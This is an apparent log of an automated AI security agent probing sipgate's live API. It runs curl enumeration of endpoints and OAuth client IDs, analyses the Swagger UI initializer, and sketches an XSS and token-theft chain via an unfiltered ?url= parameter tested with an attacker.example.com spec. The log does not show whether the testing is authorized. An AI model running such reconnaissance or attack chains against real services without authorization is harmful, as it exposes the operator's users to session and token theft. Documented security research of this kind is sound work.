@@ -22191,3 +22191,243 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] sipgate: 42 — Prior 47 driven up by the oauth2/clients app-plane 500 anomaly; this cycle deflated it (no unauthenticated 200, 500 is empty-body edge noise, KB example UUID now 400s). Standing reportable: /v2/* CORS credential reflection (validated, error-paths too), swagger-ui ?url= spec-forward + frameable doc + implicit high-scope OAuth client (defense-in-depth/phishing), plus the accepted family-wide MISCONFIG set. No critical-path vector advancing without credentials or a same-origin XSS.
+===== ANALYST bigpickle 2026-09-11 23:34:28 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mfor p in "numbers/00000000-0000-0000-0000-000000000000" "users/00000000-0000-0000-0000-000000000000"; do echo "== /v2/$p"; curl -sS -o /tmp/opencode/body.txt -D - --max-time 20 "https://api.sipgate.com/v2/$p" | grep -iE "^HTTP|^access-control|^x-b3|^vary|^content-type|^server:"; echo "--- body:"; head -c 300 /tmp/opencode/body.txt; echo; sleep 1.2; done
+== /v2/numbers/00000000-0000-0000-0000-000000000000
+HTTP/1.1 405 Method Not Allowed
+vary: origin
+x-b3-traceid: 9bf3b169ff0b64711871f0157d61fd4e
+--- body:
+
+== /v2/users/00000000-0000-0000-0000-000000000000
+HTTP/1.1 401 Unauthorized
+vary: origin
+x-b3-traceid: 8c90242fee996798e1f12145d0c57d69
+--- body:
+[0m
+[0m$ [0mfor p in "history/00000000-0000-0000-0000-000000000000" "contacts/00000000-0000-0000-0000-000000000000" "contacts/users/00000000-0000-0000-0000-000000000000"; do echo "== /v2/$p"; curl -sS -o /tmp/opencode/body.txt -D - --max-time 20 "https://api.sipgate.com/v2/$p" | grep -iE "^HTTP|^access-control|^x-b3|^vary|^content-type"; echo "--- body:"; head -c 300 /tmp/opencode/body.txt; echo; sleep 1.2; done
+== /v2/history/00000000-0000-0000-0000-000000000000
+HTTP/1.1 401 Unauthorized
+vary: origin
+x-b3-traceid: 47d341d9a7dddc88241d33a857ed9938
+--- body:
+
+== /v2/contacts/00000000-0000-0000-0000-000000000000
+HTTP/1.1 401 Unauthorized
+vary: origin
+x-b3-traceid: 93e31058e9969c59ef02878a5cbcb583
+--- body:
+
+== /v2/contacts/users/00000000-0000-0000-0000-000000000000
+HTTP/1.1 401 Unauthorized
+vary: origin
+x-b3-traceid: 5d1cd6e89f7b49a653a2ca79e50e081d
+--- body:
+[0m
+[0m$ [0mfor id in "sipgate-app-web" "platypus-swagger" "sipgate-app" "sipgate-swagger-ui"; do echo "== /v2/authorization/oauth2/clients/$id"; curl -sS -o /tmp/opencode/body.txt -D - --max-time 20 "https://api.sipgate.com/v2/authorization/oauth2/clients/$id" | grep -iE "^HTTP|^access-control|^x-b3|^vary|^content-type"; echo "--- body:"; head -c 300 /tmp/opencode/body.txt; echo; sleep 1.2; done
+== /v2/authorization/oauth2/clients/sipgate-app-web
+HTTP/1.1 400 Bad Request
+vary: origin
+x-b3-traceid: d8dc4d93a3c5d5de75e574b824445c44
+--- body:
+
+== /v2/authorization/oauth2/clients/platypus-swagger
+HTTP/1.1 400 Bad Request
+vary: origin
+x-b3-traceid: fcb967e15fda5f3a6653432c4990abc9
+--- body:
+
+== /v2/authorization/oauth2/clients/sipgate-app
+HTTP/1.1 400 Bad Request
+vary: origin
+x-b3-traceid: 742967c2f92f3fd10a05d1138343f430
+--- body:
+
+== /v2/authorization/oauth2/clients/sipgate-swagger-ui
+HTTP/1.1 400 Bad Request
+vary: origin
+x-b3-traceid: 9e01acb3afe49035dbd641bcff007001
+--- body:
+[0m
+[0m$ [0mfor p in "authorization/oauth2" "openapi.json" "version" "status"; do echo "== /v2/$p"; curl -sS -o /tmp/opencode/body.txt -D - --max-time 20 "https://api.sipgate.com/v2/$p" | grep -iE "^HTTP|^access-control|^x-b3|^vary"; echo "--- body:"; head -c 200 /tmp/opencode/body.txt; echo; sleep 1.2; done
+== /v2/authorization/oauth2
+HTTP/1.1 404 Not Found
+vary: origin
+x-b3-traceid: a839d072e8bb46b26705b48d2c19c6d6
+--- body:
+<html><body><h1>Resource not found</h1></body></html>
+== /v2/openapi.json
+HTTP/1.1 404 Not Found
+vary: origin
+x-b3-traceid: 068371783b34b13aff34fa67ef07877d
+--- body:
+<html><body><h1>Resource not found</h1></body></html>
+== /v2/version
+HTTP/1.1 404 Not Found
+vary: origin
+x-b3-traceid: acf8d0a58e11663e71e5d9ebb3cfc6b6
+--- body:
+<html><body><h1>Resource not found</h1></body></html>
+== /v2/status
+HTTP/1.1 404 Not Found
+vary: origin
+x-b3-traceid: d37ca131526ff5fb0e0f6a4152b945b3
+--- body:
+<html><body><h1>Resource not found</h1></body></html>
+[0m
+[0m$ [0mcd /tmp/opencode && curl -sS --max-time 40 -o swagger-ui-bundle.js "https://api.sipgate.com/v2/doc/swagger-ui-bundle.js" && ls -l swagger-ui-bundle.js && grep -oE '"version":"[0-9.]+"' swagger-ui-bundle.js | head -3; grep -oE 'SwaggerUIBundle\.[A-Za-z]+\s*=\s*"[0-9.]+"' swagger-ui-bundle.js | head; grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+' swagger-ui-bundle.js | sort -u | head
+-rw-r--r-- 1 runner runner 1096221 Sep 11 23:32 swagger-ui-bundle.js
+v3.10.0
+v3.20.3
+v4.0.0
+[0m
+[0m$ [0mcd /tmp/opencode && grep -oE '(swagger-ui|SwaggerUIBundle)[^"]{0,40}(v[0-9]+\.[0-9]+\.[0-9]+)' swagger-ui-bundle.js | head; grep -oE '"swagger-ui/([0-9.]+)"' swagger-ui-bundle.js | head; grep -oE '5\.[0-9]+\.[0-9]+' swagger-ui-bundle.js | sort -u | head; grep -oE 'token:? ?"[0-9a-f]{40}"' swagger-ui-bundle.js | head -1
+(no output)
+[0m
+[0m$ [0mcd /tmp/opencode && head -c 400 swagger-ui-bundle.js; echo; echo "----"; grep -oE '.{60}[0-9]\.[0-9]{1,2}\.[0-9]{1,2}.{20}' swagger-ui-bundle.js | grep -iE 'swagger|version' | head -5; echo "----"; grep -c 'swagger-ui-react\|templatedUrl\|domSanitize\|markdown' swagger-ui-bundle.js
+/*! For license information please see swagger-ui-bundle.js.LICENSE.txt */
+!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.SwaggerUIBundle=t():e.SwaggerUIBundle=t()}(this,(function(){return(()=>{var e={66419:(e,t,n)=>{e.exports=n(24848)},41511:(e,t,n)=>{e.exports=n(83363)},11128:
+----
+ate:this.truncate,className:this.className})),e},e.version="3.14.3",e.AnchorTagBuilder
+[e]||(o[e]=void 0!==t?t:{})})("versions",[]).push({version:"3.20.3",mode:r?"pure":"glo
+]?arguments[0]:J(),t=function(e){return G(e)};if(t.version="2.3.3",t.removed=[],!e||!
+ction(){i=!1},e.safeMode=function(){i=!0},e.versionString="10.7.3";for(const e in R)"
+!1}]},ll={findFiberByHostInstance:no,bundleType:0,version:"17.0.2",rendererPackageNam
+----
+1
+[0m
+[0m$ [0mcd /tmp/opencode && grep -oE 'SwaggerUI[^"]{0,30}[0-9]\.[0-9]{1,2}\.[0-9]+' swagger-ui-bundle.js | head -3; grep -oE '"description":"[^"]*SWAGGER[^"]*"[^}]{0,60}' swagger-ui-bundle.js | head -2; grep -oE '.{40}cdn\.jsdelivr\.net.{40}' swagger-ui-bundle.js | head -3
+(no output)
+[0m
+[0m$ [0mfor p in "authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/scopes" "authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/redirect-uris" "authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/grants"; do echo "== /v2/$p"; curl -sS -o /tmp/opencode/body.txt -D - --max-time 20 "https://api.sipgate.com/v2/$p" | grep -iE "^HTTP|^access-control|^x-b3|^vary"; echo "--- body:"; head -c 200 /tmp/opencode/body.txt; echo; sleep 1.2; done
+== /v2/authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/scopes
+HTTP/1.1 404 Not Found
+vary: origin
+x-b3-traceid: 5ae59a129fc95679da6e08c1e4a4cf5a
+--- body:
+<html><body><h1>Resource not found</h1></body></html>
+== /v2/authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/redirect-uris
+HTTP/1.1 404 Not Found
+vary: origin
+x-b3-traceid: 07de0e6af31df376d4b4edc901017bb8
+--- body:
+<html><body><h1>Resource not found</h1></body></html>
+== /v2/authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/grants
+HTTP/1.1 404 Not Found
+vary: origin
+x-b3-traceid: 80c0ff0bf1bb898540273ff55b03bda1
+--- body:
+<html><body><h1>Resource not found</h1></body></html>
+[0m
+[0m$ [0mcd /tmp/opencode && curl -sS --max-time 20 "https://api.sipgate.com/v2/doc/swagger-ui-bundle.js.LICENSE.txt" | head -20
+<!-- Smoketest - OK -->
+[0m
+[0m$ [0mcd /tmp/opencode && curl -sS -D - --max-time 20 "https://api.sipgate.com/v2/doc/" -o doc_index.html | grep -iE "^HTTP|^content-type"; echo "---"; curl -sS --max-time 20 "https://api.sipgate.com/v2/doc/index.html" -o doc_index2.html && grep -oE '(url\s*[=:].{0,60}|swagger.json|openapi[^"'\'' ]*|oauth2RedirectUrl[^,]{0,60}|clientId[^,]{0,40})' doc_index2.html | head -20
+HTTP/1.1 200 OK
+content-type: text/html; charset=utf-8
+---
+[0m
+[0m$ [0mcd /tmp/opencode && grep -oE 'src="[^"]*"|url:[^,]{0,80}|SwaggerUIBundle\([^)]{0,120}' doc_index.html | head; echo "---scripts---"; grep -oiE '(init|spec|openapi)[^"'\'' ]*\.js' doc_index.html | head
+src="/v2/doc/swagger-ui-bundle.js"
+src="/v2/doc/swagger-ui-standalone-preset.js"
+src="/v2/doc/keycloak-logout.js"
+src="/v2/doc/swagger-initializer.js"
+---scripts---
+initializer.js
+[0m
+[0m$ [0mcd /tmp/opencode && curl -sS --max-time 20 "https://api.sipgate.com/v2/doc/swagger-initializer.js" | head -60; echo; curl -sS --max-time 20 -D - "https://api.sipgate.com/v2/doc/swagger-ui-standalone-preset.js" -o sp.js | grep -iE "^HTTP|^content-type"
+window.onload = function() {
+  //<editor-fold desc="Changeable Configuration Block">
+
+  function getRandomInt(min, max) {
+		min = Math.ceil(min);
+		max = Math.floor(max);
+		return Math.floor(Math.random() * (max - min + 1)) + min;
+	}
+
+  var url = window.location.search.match(/url=([^&]+)/);
+  var baseUrl;
+  if (url && url.length > 1) {
+    url = decodeURIComponent(url[1]);
+  } else {
+    var port = /^(80|443)$/.test(window.location.port) || !window.location.port.length ? '' : ':'
+      + window.location.port;
+    baseUrl = "https://" + window.location.hostname + port;
+    url = baseUrl + "/v2/swagger.json";
+  }
+
+  // the following lines will be replaced by docker/configurator, when it runs in a docker-container
+  window.ui = SwaggerUIBundle({
+    oauth2RedirectUrl: baseUrl + "/v2/doc/oauth2-redirect.html",
+    url,
+    dom_id: '#swagger-ui',
+    deepLinking: true,
+    presets: [
+      SwaggerUIBundle.presets.apis,
+      SwaggerUIStandalonePreset
+    ],
+    plugins: [
+      SwaggerUIBundle.plugins.DownloadUrl, OAuthLogoutPlugin
+    ],
+    layout: "StandaloneLayout"
+  });
+
+  window.ui.initOAuth({
+    clientId: "sipgate-swagger-ui",
+    realm: "third-party",
+    appName: "sipgate-swagger-ui",
+    scopeSeparator: " ",
+    additionalQueryStringParams: {nonce: getRandomInt(1000000, 9999999)}
+  });
+
+  //</editor-fold>
+};
+
+HTTP/1.1 200 OK
+content-type: application/javascript
+[0m
+STEP 1 — DELTA
+- [CHANGED] api.sipgate.com/v2 param-subroutes: nil-UUID → uniform 401 (users/history/contacts/contacts-users), `numbers/{id}` → 405 method-router; 500-class is **path-local** to oauth2/clients/{id}, NOT systemic
+- [CHANGED] api.sipgate.com/v2/authorization/oauth2/clients/{id}: `sipgate-app-web`, `platypus-swagger`, `sipgate-app`, `sipgate-swagger-ui` → ALL 400 empty; strict UUID-format gate, client-ID enum vector dead
+- [CHANGED] api.sipgate.com/v2: `/authorization/oauth2` root, `/openapi.json`, `/version`, `/status`, and `clients/{uuid}/scopes|redirect-uris|grants` → 404 HTML — no new unauth 200 surface; clients subtree fully mapped
+- [NEW] api.sipgate.com/v2/doc/swagger-initializer.js: `?url=` decodeURIComponent'd with **no scheme/host filter**; default spec `/v2/swagger.json` is 404 → doc is an open origin-trusted spec-renderer; oauth2RedirectUrl same-origin dynamic; clientId `sipgate-swagger-ui`, realm third-party, 7-digit nonce
+
+STEP 2 — PRIORITIZE
+- [PRIO] api.sipgate.com/v2/doc/*,6.6,public-oauth-client+unfiltered-?url=+frameable doc — top remaining api asset
+- [PRIO] api.sipgate.com/v2/*,5.45,cors-credential-reflection+x-b3-traceid — re-observed on all probes this cycle (vary:origin + traceid on every status class)
+- [PRIO] api.sipgate.com/v2/authorization/oauth2/clients/{clientId},2.9,authz-consistency (down from 6.9: empty-body, format-gated, no enum)
+- [PRIO] app.dev.sipgate.com,6.0,bundle-topology drift (nemotron lead, fresh rotation main-D_WMxc4R.js)
+
+STEP 3 — HYPOTHESES
+[HYP] Swagger-ui spec-render chain on trusted api origin via unfiltered ?url=
+class: XSS
+asset: api.sipgate.com/v2/doc/
+confidence: 40
+reasoning: swagger-initializer.js passes decodeURIComponent(?url) directly to SwaggerUIBundle with no host/scheme check; default spec 404 so the page renders ONLY attacker-provided specs; spec renders on api.sipgate.com origin; doc has no XFO/CSP frame-ancestors and implicitly registers `sipgate-swagger-ui` (extreme scope set) for authorize-button flows.
+evidence_needed: HTML/script execution from a crafted spec `description`/`x-example` field rendered on api origin (browser-only); or at minimum a spec-controlled iframe/image rendered into the doc DOM
+verify_steps: HUMAN: open https://api.sipgate.com/v2/doc/?url=https://attacker/spec.json in Chromium, inspect DOM for injected element; no server-side probe possible
+impact: Spec-injection/phishing on api origin; full read/write session only if a script-executing render primitive exists (swagger version unpinnable → unknown CVE exposure); otherwise phishing amplifier only — MEDIUM chain, CRITICAL if render-XSS proven
+testability: HUMAN_ONLY
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] Special-value 500-systemic scan: disproven by 8 probes this cycle (uniform 401/405/404) — confidence 0
+- [PARKED] String client-ID variants: disproven (4/4 → 400) — confidence 0
+- [PARKED] Unauth 200 enumeration: 4 new probes → all 404; taxonomy closed
+- [PARKED] Swagger version-pin XSS audit: LICENSE.txt is `<!-- Smoketest - OK -->` placeholder, bundle mixes lib versions (markdown v3.14.3, React 17.0.2), no SwaggerUIBundle version constant — CVE check not passively feasible; folded into doc-render hypothesis
+- [FINAL] Swagger spec-render chain: confidence 40, HUMAN_ONLY, survives
+
+STEP 5 — NEXT ACTION
+- [NEXT] HUMAN: open `https://api.sipgate.com/v2/doc/?url=https://attacker.example.com/spec.json` in a real browser and confirm (a) attacker spec renders in DOM on api.sipgate.com, (b) swipe through spec `description`/`x-example` fields for HTML injection (iframe/pixel/script) — the only remaining path that could turn the CORS-reflection + implicit high-scope OAuth client into token theft
+
+STEP 6 — LEARNING
+- [LEARN] REJECTED IDOR @ api.sipgate.com/v2/{param}/…: nil-UUID on numbers(405)/users(401)/history(401)/contacts(401)/contacts-users(401) → 500-class is path-local to oauth2/clients, not systemic edge-auth bypass
+- [LEARN] REJECTED IDOR @ api.sipgate.com/v2/authorization/oauth2/clients/{id}: known cross-realm client IDs (sipgate-app-web, platypus-swagger, sipgate-app, sipgate-swagger-ui) → uniform 400; strict UUID-format gate; child subroutes → 404; no unauth client-metadata enum
+- [LEARN] ACCEPTED MISCONFIG @ api.sipgate.com/v2/doc: `?url=` unfiltered + default spec 404 + frameable + implicit high-scope OAuth client = open origin-trusted spec-renderer (phishing/spec-injection surface; XSS unproven) — reportable as defense-in-depth with HUMAN browser POC attached
+- [LEARN] ACCEPTED INFO @ api.sipgate.com/v2: response-code taxonomy confirmed — 401 empty (gated collections), 400 empty (format-gated app-plane), 500 empty (miss-throw app-plane, oauth2/clients only), 405 empty (method-router numbers/{id}), 404 HTML (unknown/routed children); only oauth2/clients/{id} reaches app-plane unauth
+- [LEARN] REJECTED OTHER @ api.sipgate.com/v2/doc: LICENSE.txt placeholder `<!-- Smoketest - OK -->`, no pin-able SwaggerUIBundle version (markdown v3.14.3 / React 17.0.2 embedded) → render-CVE audit impossible passively
+
+STEP 7 — RISK
+- [RISK] sipgate: 40 — Both open api hypotheses deflated by direct probes: back to a closed taxonomy with oauth2/clients/{id} (empty-body, format-gated 500) as the sole unauth app-plane reach = reportable only as authz-consistency. Standing report kit unchanged and validated: (1) /v2/* CORS-credential reflection (+x-b3-traceid), (2) swagger ?url= spec-forward + frameable doc + high-scope implicit client (defense-in-depth/phishing, browser POC needed), (3) oauth2/clients authz-consistency. Nothing on a critical path without credentials or a proven render-XSS.
